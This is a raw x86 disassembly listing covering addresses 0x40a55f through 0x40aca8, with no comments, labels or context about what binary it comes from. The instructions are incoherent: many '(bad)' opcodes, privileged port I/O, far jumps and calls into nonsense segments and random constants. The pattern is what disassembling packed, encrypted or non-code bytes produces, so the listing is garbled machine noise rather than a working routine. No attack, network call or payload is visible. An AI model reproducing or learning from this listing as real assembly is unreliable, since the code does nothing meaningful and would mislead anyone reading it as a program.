  40a55f:	jp     0x40a5ab
  40a561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a562:	and    DWORD PTR [edx],edx
  40a564:	repnz push 0xffffffd2
  40a567:	sub    ah,BYTE PTR [ecx-0x24530f40]
  40a56d:	out    dx,al
  40a56e:	inc    ebx
  40a56f:	fdivr  DWORD PTR [ebx]
  40a571:	sbb    dl,BYTE PTR [esi+0x5d]
  40a574:	stc    
  40a575:	sbb    al,0x67
  40a577:	or     eax,0x47fddc23
  40a57c:	dec    edi
  40a57d:	add    al,cl
  40a57f:	inc    esi
  40a580:	jo     0x40a5e2
  40a582:	adc    DWORD PTR [ecx],0x22
  40a585:	or     ah,BYTE PTR [ecx]
  40a587:	jne    0x40a59e
  40a589:	mov    WORD PTR [edi-0xcfaa193],es
  40a58f:	(bad)  
  40a591:	mov    edx,DWORD PTR [ebp+0x2c9023c7]
  40a597:	hlt    
  40a598:	pop    ds
  40a599:	xchg   edx,eax
  40a59a:	jl     0x40a536
  40a59c:	aam    0x42
  40a59e:	loope  0x40a5db
  40a5a0:	pop    ss
  40a5a1:	out    0xd4,eax
  40a5a3:	arpl   WORD PTR [edx+0x6],si
  40a5a6:	sar    DWORD PTR [ecx-0x380ba648],cl
  40a5ac:	nop
  40a5ad:	int3   
  40a5ae:	aas    
  40a5af:	test   DWORD PTR [eax],edx
  40a5b1:	sub    edi,ebx
  40a5b3:	test   eax,0x955f1296
  40a5b8:	out    0x75,al
  40a5ba:	and    BYTE PTR [esi],0x44
  40a5bd:	in     eax,0x87
  40a5bf:	test   eax,0x20d63715
  40a5c4:	jp     0x40a57d
  40a5c6:	xor    eax,0xac7827b5
  40a5cb:	mov    DWORD PTR [ecx],ecx
  40a5cd:	pop    ds
  40a5ce:	(bad)  
  40a5d0:	out    0x52,eax
  40a5d2:	dec    edx
  40a5d3:	cmp    eax,0x49573b1f
  40a5d8:	pop    ss
  40a5d9:	gs inc si
  40a5dc:	out    0x79,eax
  40a5de:	stos   DWORD PTR es:[edi],eax
  40a5df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5e0:	stos   DWORD PTR es:[edi],eax
  40a5e1:	jb     0x40a64d
  40a5e3:	(bad)  
  40a5e5:	or     DWORD PTR [ebx],0x3c
  40a5e8:	xchg   BYTE PTR [esi+0x6e],dh
  40a5eb:	mov    ch,cl
  40a5ed:	stos   DWORD PTR es:[edi],eax
  40a5ee:	push   0x5e
  40a5f0:	sar    BYTE PTR [ebx+0x5b],1
  40a5f3:	sar    ah,cl
  40a5f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5f6:	dec    ebp
  40a5f7:	out    0x9b,al
  40a5f9:	xchg   edi,eax
  40a5fa:	sti    
  40a5fb:	xchg   esp,eax
  40a5fc:	popf   
  40a5fd:	ss test eax,0x9c650b92
  40a603:	xchg   esp,eax
  40a604:	mov    al,ds:0x7ce6501f
  40a609:	lods   al,BYTE PTR ds:[esi]
  40a60a:	arpl   si,bp
  40a60c:	loope  0x40a5af
  40a60e:	mov    ch,0xb
  40a610:	cwde   
  40a611:	out    dx,al
  40a612:	in     eax,dx
  40a613:	adc    eax,0x836bd558
  40a618:	sar    BYTE PTR [eax-0x2c],0x37
  40a61c:	(bad)  
  40a61d:	daa    
  40a61e:	stc    
  40a61f:	and    al,0xd4
  40a621:	popf   
  40a622:	mov    BYTE PTR [ecx],dh
  40a624:	and    al,0xe1
  40a626:	mov    WORD PTR [ebp+0x5c554e92],cs
  40a62c:	loopne 0x40a61a
  40a62e:	test   al,0xef
  40a630:	add    DWORD PTR [eax+0x3d],0x1a
  40a634:	jp     0x40a654
  40a636:	jo     0x40a5f8
  40a638:	out    dx,eax
  40a639:	fiadd  DWORD PTR [ebx-0x2b6879a3]
  40a63f:	retf   0x63cd
  40a642:	mov    cl,0xd8
  40a644:	out    dx,al
  40a645:	or     BYTE PTR [ebx+0x42],ch
  40a648:	emms   
  40a64a:	mov    dl,0x80
  40a64c:	daa    
  40a64d:	out    dx,eax
  40a64e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a64f:	mov    cl,0xef
  40a651:	pop    eax
  40a652:	mov    ss,ebp
  40a654:	and    DWORD PTR [ebx+0x51],0x56dfe6e0
  40a65b:	loope  0x40a69c
  40a65d:	dec    BYTE PTR [ebx-0x6a]
  40a660:	fldcw  WORD PTR [edi]
  40a662:	mov    ah,0x36
  40a664:	dec    BYTE PTR [esi+0x717bd123]
  40a66a:	or     dl,BYTE PTR [edi]
  40a66c:	inc    edi
  40a66d:	cmp    eax,0xdc519a51
  40a672:	push   ebp
  40a673:	or     BYTE PTR ds:0x4681383,cl
  40a679:	(bad)  
  40a67a:	outs   dx,BYTE PTR ds:[esi]
  40a67b:	dec    esi
  40a67c:	pushf  
  40a67d:	(bad)  
  40a67e:	pushf  
  40a67f:	mov    ebp,DWORD PTR [ebp+0x388d7439]
  40a685:	push   edx
  40a686:	adc    ebx,DWORD PTR [eax+edx*8-0x14]
  40a68a:	mov    edx,0xc435e184
  40a68f:	das    
  40a690:	retf   
  40a691:	and    ebx,DWORD PTR [esi]
  40a693:	pushf  
  40a694:	mov    edi,0xbcf28aa7
  40a699:	mov    ah,dl
  40a69b:	sbb    BYTE PTR [edi+0x4b65237a],ch
  40a6a1:	test   ebp,0x81f67626
  40a6a7:	shl    BYTE PTR [esi],cl
  40a6a9:	scas   eax,DWORD PTR es:[edi]
  40a6aa:	push   edi
  40a6ab:	(bad)  
  40a6ac:	sbb    eax,0x4a88a72e
  40a6b1:	cmp    DWORD PTR [esp+eiz*2+0x3693e77c],0xffffffb8
  40a6b9:	xlat   BYTE PTR ds:[ebx]
  40a6ba:	scas   al,BYTE PTR es:[edi]
  40a6bb:	mov    ebx,0xd04589fe
  40a6c0:	mov    eax,DWORD PTR [ebp-0x4c]
  40a6c3:	xor    eax,esi
  40a6c5:	add    eax,edi
  40a6c7:	jmp    0x40abd2
  40a6cc:	cmp    al,0x3f
  40a6ce:	ret    
  40a6cf:	rol    bl,cl
  40a6d1:	rcl    cl,cl
  40a6d3:	int    0xcd
  40a6d5:	push   cs
  40a6d6:	nop
  40a6d7:	fimul  WORD PTR [ecx]
  40a6d9:	pusha  
  40a6da:	clc    
  40a6db:	mov    dl,0x72
  40a6dd:	mov    bh,BYTE PTR [eax+0x78]
  40a6e0:	push   0x7c
  40a6e2:	js     0x40a75c
  40a6e4:	mov    ds:0xb35469a5,al
  40a6e9:	repz in eax,dx
  40a6eb:	dec    eax
  40a6ec:	or     DWORD PTR ds:0xaa2e,ecx
  40a6f1:	or     al,BYTE PTR [esi]
  40a6f3:	dec    ebp
  40a6f4:	push   esp
  40a6f5:	dec    esi
  40a6f6:	lods   al,BYTE PTR ds:[esi]
  40a6f7:	jns    0x40a6c3
  40a6f9:	xor    al,0x81
  40a6fb:	mov    ah,0xfe
  40a6fd:	ins    BYTE PTR es:[edi],dx
  40a6fe:	mov    eax,es
  40a700:	pop    eax
  40a701:	les    edi,FWORD PTR [eax]
  40a703:	add    al,0xe
  40a705:	sahf   
  40a706:	popf   
  40a707:	fdiv   DWORD PTR [edx-0xc]
  40a70a:	xchg   ebx,eax
  40a70b:	jae    0x40a754
  40a70d:	lds    eax,FWORD PTR [edi]
  40a70f:	xchg   ecx,eax
  40a710:	ss pop ds
  40a712:	lahf   
  40a713:	inc    esp
  40a714:	mov    al,0x4
  40a716:	in     al,dx
  40a717:	retf   0x5a3c
  40a71a:	dec    esp
  40a71b:	jl     0x40a76f
  40a71d:	inc    ebp
  40a71e:	sub    BYTE PTR [ebx-0x4d541d40],dl
  40a724:	loope  0x40a737
  40a726:	mov    edi,esi
  40a728:	fadd   DWORD PTR [eax+eax*2+0x2f74e891]
  40a72f:	stos   BYTE PTR es:[edi],al
  40a730:	inc    edx
  40a731:	(bad)  
  40a732:	xchg   ebx,eax
  40a733:	xchg   ecx,eax
  40a734:	push   0x3422a7d
  40a739:	test   eax,0xb202907b
  40a73e:	cmp    BYTE PTR [bp+si],dl
  40a741:	shr    eax,1
  40a743:	repz sub BYTE PTR [eax+0xb],0x2b
  40a748:	outs   dx,DWORD PTR ds:[esi]
  40a749:	retf   0x34d0
  40a74c:	mov    cl,0x57
  40a74e:	stos   DWORD PTR es:[edi],eax
  40a74f:	ins    DWORD PTR es:[edi],dx
  40a750:	idiv   BYTE PTR [eax-0x65]
  40a753:	mov    esi,0xc7f2b3e7
  40a758:	xor    eax,DWORD PTR [ebp-0x11]
  40a75b:	(bad)  
  40a75d:	imul   eax,DWORD PTR [edi+0x73],0x53
  40a761:	fwait
  40a762:	js     0x40a700
  40a764:	mov    ecx,0xd13d1bc4
  40a769:	test   al,0x7f
  40a76b:	adc    bl,bh
  40a76d:	adc    DWORD PTR [eax],ebx
  40a76f:	stc    
  40a770:	icebp  
  40a771:	cli    
  40a772:	and    cl,bh
  40a774:	addr16 (bad) 
  40a776:	cmp    ecx,DWORD PTR [ecx+0x4e]
  40a779:	push   ebp
  40a77a:	push   cs
  40a77b:	pop    esp
  40a77c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a77d:	popf   
  40a77e:	cmp    eax,0x15b3e9c7
  40a783:	arpl   sp,sp
  40a785:	test   eax,ecx
  40a787:	inc    ebx
  40a788:	xchg   esi,eax
  40a789:	sbb    al,0xcb
  40a78b:	xchg   edi,eax
  40a78c:	mov    edi,0xafc681da
  40a791:	and    eax,edi
  40a793:	xchg   ebx,eax
  40a794:	adc    dh,bh
  40a796:	data16 jns 0x40a807
  40a799:	sbb    edi,DWORD PTR [edx]
  40a79b:	pop    ss
  40a79c:	sahf   
  40a79d:	push   ebx
  40a79e:	fdivr  QWORD PTR [eax+0x149fcb11]
  40a7a4:	adc    ebp,DWORD PTR [eax]
  40a7a6:	test   al,0x61
  40a7a8:	jne    0x40a7ca
  40a7aa:	push   esi
  40a7ab:	aam    0xab
  40a7ad:	add    ebp,DWORD PTR [eax-0x468c131]
  40a7b3:	inc    eax
  40a7b4:	mov    cl,0xe5
  40a7b6:	mov    ecx,0xd50595a0
  40a7bb:	mov    edx,0xa3c454fe
  40a7c0:	jbe    0x40a7f4
  40a7c2:	loop   0x40a783
  40a7c4:	adc    esi,DWORD PTR [edx-0xe]
  40a7c7:	call   0x57b5496f
  40a7cc:	je     0x40a7df
  40a7ce:	sbb    edx,DWORD PTR [ebp-0x7d]
  40a7d1:	jae    0x40a7b9
  40a7d3:	retf   
  40a7d4:	pusha  
  40a7d5:	lds    edi,FWORD PTR [edi]
  40a7d7:	push   es
  40a7d8:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40a7da:	retf   0x753
  40a7dd:	and    eax,0xc9d1c1da
  40a7e2:	cmc    
  40a7e3:	outs   dx,BYTE PTR ds:[esi]
  40a7e4:	sti    
  40a7e5:	(bad)  
  40a7e6:	scas   al,BYTE PTR es:[edi]
  40a7e7:	out    0xf2,eax
  40a7e9:	cmp    eax,DWORD PTR [edx+0xc]
  40a7ec:	and    BYTE PTR [ecx],bh
  40a7ee:	(bad)  
  40a7ef:	ins    DWORD PTR es:[edi],dx
  40a7f0:	into   
  40a7f1:	retf   0x78e1
  40a7f4:	into   
  40a7f5:	enter  0xd9e7,0x37
  40a7f9:	aad    0xbf
  40a7fb:	pop    ecx
  40a7fc:	scas   al,BYTE PTR es:[edi]
  40a7fd:	iret   
  40a7fe:	inc    eax
  40a7ff:	jnp    0x40a7af
  40a801:	cld    
  40a802:	paddq  mm7,mm1
  40a805:	(bad)  
  40a806:	aam    0x67
  40a808:	jle    0x40a820
  40a80a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a80b:	mov    ds:0xebf2af7,eax
  40a810:	mov    bh,0xb2
  40a812:	test   al,0x14
  40a814:	retf   0xbaa2
  40a817:	inc    ecx
  40a818:	jecxz  0x40a7d9
  40a81a:	test   al,0x9f
  40a81c:	adc    al,0xf3
  40a81e:	mov    bl,0x16
  40a820:	lahf   
  40a821:	push   0x7b
  40a823:	mov    edx,0xd9792370
  40a828:	loope  0x40a884
  40a82a:	scas   al,BYTE PTR es:[edi]
  40a82b:	and    DWORD PTR [esi-0x2c],ebp
  40a82e:	arpl   WORD PTR [ebp+0x1e5b7656],bx
  40a834:	jnp    0x40a880
  40a836:	sub    ebp,edx
  40a838:	add    BYTE PTR [edx-0x19],bl
  40a83b:	or     DWORD PTR [eax*2-0x1b237209],edx
  40a842:	loope  0x40a87b
  40a844:	popa   
  40a845:	test   BYTE PTR [edx+0x152ea145],bh
  40a84b:	pop    eax
  40a84c:	fldenv [esi+eax*1+0x35]
  40a850:	pop    ebx
  40a851:	jmp    0x15a6:0x7ebbe3ef
  40a858:	and    al,0x58
  40a85a:	jnp    0x40a8bd
  40a85c:	das    
  40a85d:	lea    esp,[ebx+esi*4]
  40a860:	fisub  DWORD PTR [ebp-0x2bf66121]
  40a866:	mov    esp,0xe8fd457
  40a86b:	xchg   DWORD PTR [edi-0xb],esp
  40a86e:	repz jb 0x40a8e1
  40a871:	psrlw  mm6,QWORD PTR [eax]
  40a874:	clc    
  40a875:	daa    
  40a876:	daa    
  40a877:	adc    eax,0x7bdbe43d
  40a87c:	scas   eax,DWORD PTR es:[edi]
  40a87d:	pop    es
  40a87e:	sar    BYTE PTR [ecx],cl
  40a880:	jae    0x40a8b6
  40a882:	or     al,0x30
  40a884:	cld    
  40a885:	ja     0x40a8b5
  40a887:	jno    0x40a874
  40a889:	jno    0x40a906
  40a88b:	mov    al,ds:0x77c5877
  40a890:	jae    0x40a8d9
  40a892:	imul   esp,DWORD PTR [edi+0x7],0xffffffa1
  40a896:	fbld   TBYTE PTR [edi-0x73a4d14c]
  40a89c:	aaa    
  40a89d:	stos   BYTE PTR es:[edi],al
  40a89e:	push   ebx
  40a89f:	shr    BYTE PTR [ebp-0x64639c31],0x66
  40a8a6:	inc    ebx
  40a8a7:	pop    eax
  40a8a8:	lahf   
  40a8a9:	jno    0x40a880
  40a8ab:	or     BYTE PTR [eax+0x2d1822b8],dh
  40a8b1:	add    eax,0xaa7b56df
  40a8b6:	inc    esp
  40a8b7:	xor    bh,BYTE PTR [ebx+0x29551c41]
  40a8bd:	dec    ecx
  40a8be:	inc    esp
  40a8bf:	mov    ds:0xfb6ee999,eax
  40a8c4:	js     0x40a889
  40a8c6:	cmc    
  40a8c7:	inc    edx
  40a8c8:	mov    dh,0xfd
  40a8ca:	hlt    
  40a8cb:	push   ebx
  40a8cc:	dec    eax
  40a8cd:	fbld   TBYTE PTR [eax]
  40a8cf:	jns    0x40a884
  40a8d1:	and    ch,BYTE PTR [ecx-0x18]
  40a8d4:	push   ebx
  40a8d5:	arpl   WORD PTR [ebp-0x79b97376],bp
  40a8db:	cmp    eax,0x4dfa2aa5
  40a8e0:	adc    al,0x3f
  40a8e2:	call   0xb4002af0
  40a8e7:	in     al,dx
  40a8e8:	add    eax,0xb58761b7
  40a8ed:	mov    ebx,0xa01c78c
  40a8f2:	xchg   ecx,eax
  40a8f3:	fsubp  st(1),st
  40a8f5:	imul   ebp,DWORD PTR [eax-0x7b545c55],0x43
  40a8fc:	xor    dh,BYTE PTR [esi]
  40a8fe:	xor    cl,dl
  40a900:	pusha  
  40a901:	in     al,0x55
  40a903:	(bad)  
  40a904:	xchg   ecx,eax
  40a905:	mov    edx,0xc3d341dc
  40a90a:	scas   al,BYTE PTR es:[edi]
  40a90b:	push   edi
  40a90c:	pop    eax
  40a90d:	xor    BYTE PTR ds:0x59d07a0b,al
  40a913:	pop    edx
  40a914:	mov    edi,DWORD PTR ds:0x5ed68a25
  40a91a:	pop    esp
  40a91b:	je     0x40a92e
  40a91d:	ins    BYTE PTR es:[edi],dx
  40a91e:	stos   BYTE PTR es:[edi],al
  40a91f:	push   0xffffffab
  40a921:	mov    ds:0xe60ddb61,eax
  40a926:	mov    ah,0xab
  40a928:	and    DWORD PTR ds:0xfeb5b79e,0xc0c355ac
  40a932:	aam    0xfe
  40a934:	push   ebp
  40a935:	repnz sub ebx,DWORD PTR [ebp+0x5e0e0274]
  40a93c:	pusha  
  40a93d:	or     BYTE PTR [eax-0x14bce052],dh
  40a943:	es retf 
  40a945:	bound  esp,QWORD PTR [edx]
  40a947:	push   0x7
  40a949:	into   
  40a94a:	imul   edx,esi,0x33
  40a94d:	dec    esp
  40a94e:	mov    ebx,0x904d4bea
  40a953:	jg     0x40a90a
  40a955:	fcom   DWORD PTR [edi]
  40a957:	pop    ecx
  40a958:	dec    DWORD PTR [ebp+0x4fd8d8e5]
  40a95e:	lock xchg ebx,eax
  40a960:	mov    ebx,0xc7045d55
  40a965:	add    BYTE PTR [edi-0xf],cl
  40a968:	mov    eax,ds:0x9ff6c45c
  40a96d:	iret   
  40a96e:	repnz iret 
  40a970:	pop    esp
  40a971:	and    edi,ebp
  40a973:	add    al,0x8d
  40a975:	push   cs
  40a976:	dec    esp
  40a977:	sub    DWORD PTR [ebp-0x24],edx
  40a97a:	jo     0x40a905
  40a97c:	pop    ebp
  40a97d:	(bad)  
  40a97e:	pop    esp
  40a97f:	sbb    BYTE PTR [edx+0x44],dl
  40a982:	fisttp DWORD PTR [edi-0x26]
  40a985:	stos   BYTE PTR es:[edi],al
  40a986:	sbb    eax,0x93f55e28
  40a98b:	imul   ebx,DWORD PTR [edx],0xfffffff0
  40a98e:	call   0x5dac:0xc8a57463
  40a995:	dec    esp
  40a996:	or     ebx,ecx
  40a998:	push   esp
  40a999:	adc    BYTE PTR [ebx+0x7a726910],cl
  40a99f:	sbb    bl,ah
  40a9a1:	outs   dx,DWORD PTR ds:[esi]
  40a9a2:	cmp    DWORD PTR [ebp-0x2a],ebx
  40a9a5:	cmc    
  40a9a6:	sub    DWORD PTR [ebx],eax
  40a9a8:	adc    ecx,ecx
  40a9aa:	jle    0x40a9bc
  40a9ac:	cmp    al,0x2d
  40a9ae:	stos   BYTE PTR es:[edi],al
  40a9af:	jne    0x40a9fd
  40a9b1:	cwde   
  40a9b2:	adc    dl,BYTE PTR [eax-0x44]
  40a9b5:	xor    eax,0x10d86db9
  40a9ba:	cmp    DWORD PTR [edx],ecx
  40a9bc:	shl    ah,cl
  40a9be:	jnp    0x40a9c1
  40a9c0:	fld    TBYTE PTR [edx-0x45728bf5]
  40a9c6:	inc    ebx
  40a9c7:	push   ebp
  40a9c8:	mov    ds:0x6f4a0bb9,eax
  40a9cd:	adc    cl,BYTE PTR [edx-0x7ff1c341]
  40a9d3:	loop   0x40a967
  40a9d5:	mov    edi,0x7b727ac3
  40a9da:	push   edx
  40a9db:	adc    dh,0xa3
  40a9de:	xchg   BYTE PTR [ecx],al
  40a9e0:	fnsave [eax-0xfd04286]
  40a9e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9e7:	and    eax,0x9a1ca4cc
  40a9ec:	enter  0xc509,0xbe
  40a9f0:	ret    
  40a9f1:	fsubr  st,st(7)
  40a9f3:	(bad)  
  40a9f4:	jmp    0x40aa2c
  40a9f6:	rcl    BYTE PTR [ebx-0x6d],cl
  40a9f9:	jp     0x40aa2f
  40a9fb:	rol    esi,1
  40a9fd:	mov    BYTE PTR [ecx],cl
  40a9ff:	ds mov esi,0x5cdc6b49
  40aa05:	loope  0x40aa51
  40aa07:	or     BYTE PTR [ebp-0xacb7aa7],al
  40aa0d:	adc    al,0x5a
  40aa0f:	sbb    BYTE PTR [esi-0x72],cl
  40aa12:	cmp    BYTE PTR [esi+0x54],dl
  40aa15:	cmp    al,0xc
  40aa17:	div    ch
  40aa19:	dec    ebx
  40aa1a:	add    bl,dh
  40aa1c:	stc    
  40aa1d:	jns    0x40aa88
  40aa1f:	dec    esp
  40aa20:	out    0xf6,eax
  40aa22:	sub    ch,BYTE PTR ds:0x163dedf3
  40aa28:	xor    eax,0x435260d1
  40aa2d:	or     edx,DWORD PTR [edi]
  40aa2f:	rol    ecx,cl
  40aa31:	stos   DWORD PTR es:[edi],eax
  40aa32:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40aa34:	or     bl,BYTE PTR [edi-0x15]
  40aa37:	adc    DWORD PTR [edi-0xa8634ce],0xffffffee
  40aa3e:	xchg   ecx,eax
  40aa3f:	sub    eax,0xa36e35b7
  40aa44:	call   0xcafb4239
  40aa49:	add    al,0xdc
  40aa4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa4c:	adc    DWORD PTR [edx+0xf],ecx
  40aa4f:	sub    eax,0x6a7577d8
  40aa54:	int    0x7c
  40aa56:	mov    edi,esi
  40aa58:	ins    BYTE PTR es:[edi],dx
  40aa59:	push   ds
  40aa5a:	fisubr WORD PTR cs:[ebx]
  40aa5d:	scas   al,BYTE PTR es:[edi]
  40aa5e:	add    DWORD PTR [ecx+0x67],eax
  40aa61:	mov    gs,WORD PTR [edx+edi*8+0x72282c48]
  40aa68:	xlat   BYTE PTR ds:[ebx]
  40aa69:	cmp    ch,0x22
  40aa6c:	push   edx
  40aa6d:	out    0xa4,al
  40aa6f:	daa    
  40aa70:	xor    ebp,edi
  40aa72:	adc    cl,BYTE PTR [eax-0x1a51e011]
  40aa78:	and    al,BYTE PTR [ebx]
  40aa7a:	pop    ebp
  40aa7b:	sbb    DWORD PTR [ecx+0x1a1f578b],edx
  40aa81:	mov    ch,0x1f
  40aa83:	or     ah,BYTE PTR [edx+0x46]
  40aa86:	add    dl,BYTE PTR [ebx-0x54]
  40aa89:	xchg   ecx,eax
  40aa8a:	inc    edx
  40aa8b:	adc    DWORD PTR [edx+0x12c54fe5],edx
  40aa91:	jnp    0x40aab4
  40aa93:	or     DWORD PTR [edi-0x4a],0x6c60d2ab
  40aa9a:	nop
  40aa9b:	xor    edx,ebp
  40aa9d:	sub    edx,DWORD PTR [edx]
  40aa9f:	add    bl,BYTE PTR [esi+0x5a]
  40aaa2:	mov    BYTE PTR [ebp-0x2ea8e07f],dh
  40aaa8:	ja     0x40aa4f
  40aaaa:	imul   ebp,DWORD PTR [esi+0x4781cb62],0xc968e120
  40aab4:	das    
  40aab5:	mov    ds:0xc9b4e4af,eax
  40aaba:	popf   
  40aabb:	pop    ebx
  40aabc:	or     DWORD PTR [esi-0x7bd6a29f],ecx
  40aac2:	shl    dh,cl
  40aac4:	pop    edx
  40aac5:	xlat   BYTE PTR ds:[ebx]
  40aac6:	push   esi
  40aac7:	retf   
  40aac8:	aas    
  40aac9:	imul   DWORD PTR [ebx-0x10]
  40aacc:	pop    ecx
  40aacd:	mov    eax,0xa154e889
  40aad2:	sub    eax,DWORD PTR [edi+0x3c]
  40aad5:	fbstp  TBYTE PTR [eax]
  40aad7:	(bad)  
  40aad8:	jmp    0x5957:0x6853d69a
  40aadf:	(bad)  
  40aae0:	bound  esp,QWORD PTR [esi+ecx*2-0x36ecb910]
  40aae7:	sub    edi,esi
  40aae9:	mov    esp,0x3812c911
  40aaee:	jge    0x40ab1c
  40aaf0:	jno    0x40aa90
  40aaf2:	fnstenv [esi]
  40aaf4:	aam    0xe1
  40aaf6:	fisub  DWORD PTR [edi+0x3b]
  40aaf9:	mov    esi,0xc2a4294
  40aafe:	daa    
  40aaff:	inc    ebp
  40ab00:	retf   0xc97f
  40ab03:	xchg   ebp,eax
  40ab04:	fbld   TBYTE PTR [esi-0x781cc86d]
  40ab0a:	sub    al,BYTE PTR [esi+0x10bc2b8b]
  40ab10:	pushf  
  40ab11:	jmp    0xb48f:0xf3fa89d1
  40ab18:	loope  0x40aaf4
  40ab1a:	es mov ecx,0x2774bba9
  40ab20:	push   es
  40ab21:	push   ebp
  40ab22:	push   ds
  40ab23:	inc    esp
  40ab24:	cmp    edx,DWORD PTR ds:0xa72fc9b1
  40ab2a:	and    BYTE PTR [ebp+ecx*2+0x547127bd],ah
  40ab31:	sbb    eax,0xd759a3ec
  40ab36:	lods   eax,DWORD PTR ds:[esi]
  40ab37:	mov    eax,ds:0x34cff5f5
  40ab3c:	jno    0x40abae
  40ab3e:	(bad)  
  40ab3f:	cmc    
  40ab40:	mov    ds:0xb0ca3c09,al
  40ab45:	stc    
  40ab46:	loop   0x40ab9d
  40ab48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab49:	add    eax,0x919b62e1
  40ab4e:	int    0x5e
  40ab50:	mov    edi,0xcd2f72b4
  40ab55:	je     0x40abb1
  40ab57:	and    eax,0x6cc93b6d
  40ab5c:	aam    0xe6
  40ab5e:	inc    ebx
  40ab5f:	fisubr WORD PTR [ebx-0x21]
  40ab62:	push   esi
  40ab63:	sti    
  40ab64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab65:	mov    ds:0x5b9c1653,eax
  40ab6a:	jp     0x40ab44
  40ab6c:	mov    ch,0xca
  40ab6e:	and    eax,0xb4eb9682
  40ab73:	xlat   BYTE PTR ds:[ebx]
  40ab74:	lock jecxz 0x40ab59
  40ab77:	ret    0x1ebb
  40ab7a:	push   edi
  40ab7b:	rol    DWORD PTR ds:0x59d2f394,1
  40ab81:	mov    edx,edx
  40ab83:	jge    0x40ab5e
  40ab85:	cmp    bl,BYTE PTR [ebx]
  40ab87:	call   0x122e3530
  40ab8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab8d:	cmc    
  40ab8e:	or     eax,ecx
  40ab90:	ins    DWORD PTR es:[edi],dx
  40ab91:	imul   esi,DWORD PTR [eax],0xe80666c3
  40ab97:	fsub   DWORD PTR [ebx-0x2f88ff7f]
  40ab9d:	sbb    dl,ch
  40ab9f:	ficomp DWORD PTR [ecx]
  40aba1:	hlt    
  40aba2:	jp     0x40abcd
  40aba4:	inc    edi
  40aba5:	retf   
  40aba6:	xchg   ecx,eax
  40aba7:	push   0xfffffff4
  40aba9:	sar    ebp,cl
  40abab:	fimul  DWORD PTR [eax]
  40abad:	mov    ds:0xfdc0dceb,al
  40abb2:	retf   0x7a0d
  40abb5:	jb     0x40ac0f
  40abb7:	push   ebx
  40abb8:	test   BYTE PTR [esi+0x48feb339],al
  40abbe:	repnz pushf 
  40abc0:	lods   al,BYTE PTR ds:[esi]
  40abc1:	(bad)  
  40abc2:	aaa    
  40abc3:	ds ins BYTE PTR es:[edi],dx
  40abc5:	stos   DWORD PTR es:[edi],eax
  40abc6:	or     BYTE PTR [ecx],bh
  40abc8:	fwait
  40abc9:	pop    es
  40abca:	dec    esi
  40abcb:	fst    DWORD PTR [ecx-0x62]
  40abce:	fnsave [edi-0x61]
  40abd1:	fisttp DWORD PTR [ecx+0x6e9cc45]
  40abd7:	add    eax,0x3cc90000
  40abdc:	leave  
  40abdd:	ret    
  40abde:	leave  
  40abdf:	leave  
  40abe0:	leave  
  40abe1:	retf   0xa9ef
  40abe4:	int    0x9e
  40abe6:	dec    DWORD PTR [edx-0x72a3ad17]
  40abec:	js     0x40ac66
  40abee:	push   0x7c
  40abf0:	js     0x40ac6a
  40abf2:	pop    ebp
  40abf3:	push   edx
  40abf4:	add    eax,0xcb41da60
  40abf9:	(bad)  
  40abfa:	xlat   BYTE PTR ds:[ebx]
  40abfb:	mov    esp,0xb21f034c
  40ac00:	add    al,0x39
  40ac02:	add    eax,0xed40829a
  40ac07:	xor    ebp,DWORD PTR [edi]
  40ac09:	leave  
  40ac0a:	sub    ch,bh
  40ac0c:	jnp    0x40ac3a
  40ac0e:	and    BYTE PTR [ebp+esi*2-0x25],bh
  40ac12:	(bad)  
  40ac13:	ss inc edx
  40ac15:	add    al,0x36
  40ac17:	xor    ebx,DWORD PTR [eax-0x1c]
  40ac1a:	xor    BYTE PTR [edx-0x7c826fe1],ch
  40ac20:	mov    ah,0x1c
  40ac22:	ins    BYTE PTR es:[edi],dx
  40ac23:	xchg   ebp,eax
  40ac24:	cmp    al,0x56
  40ac26:	adc    BYTE PTR [esi+0x4f],al
  40ac29:	jle    0x40abac
  40ac2b:	xor    eax,0x7818893b
  40ac30:	lahf   
  40ac31:	push   edx
  40ac32:	(bad)  
  40ac33:	mov    ah,BYTE PTR [ebp+0x65]
  40ac36:	xchg   ecx,eax
  40ac37:	call   0x4a74:0x5f129bfb
  40ac3e:	sub    BYTE PTR [edx+0x555188f6],0xc3
  40ac45:	psllq  mm7,QWORD PTR [eax+0x1095c38]
  40ac4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac4d:	jecxz  0x40ac8f
  40ac4f:	pop    edi
  40ac50:	into   
  40ac51:	mov    ah,0x11
  40ac53:	sbb    al,0xbe
  40ac55:	add    al,0xb1
  40ac57:	or     BYTE PTR [eax+ebp*1-0x9f99d6c],al
  40ac5e:	jg     0x40ac5c
  40ac60:	jnp    0x40acbb
  40ac62:	(bad)  
  40ac63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac64:	je     0x40acbf
  40ac66:	dec    ecx
  40ac67:	hlt    
  40ac68:	div    bl
  40ac6a:	xchg   edi,eax
  40ac6b:	fstp   QWORD PTR ds:0xa4240ba4
  40ac71:	mov    ds:0x13ea9933,al
  40ac76:	jmp    0x4ec81bad
  40ac7b:	mov    cs,WORD PTR [esp+eax*4-0x3fd5575d]
  40ac82:	enter  0xe047,0xed
  40ac86:	sbb    al,0xec
  40ac88:	pop    ds
  40ac89:	hlt    
  40ac8a:	mov    eax,edx
  40ac8c:	fst    QWORD PTR [edi-0x238cb502]
  40ac92:	sbb    dh,cl
  40ac94:	(bad)
  40ac99:	pop    edi
  40ac9a:	call   0xb7c5:0xb81a01a0
  40aca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aca2:	scas   al,BYTE PTR es:[edi]
  40aca3:	xchg   esp,eax
  40aca4:	mov    ch,0x80
  40aca6:	fcmovbe st,st(6)
  40aca8:	js     0x40ac63
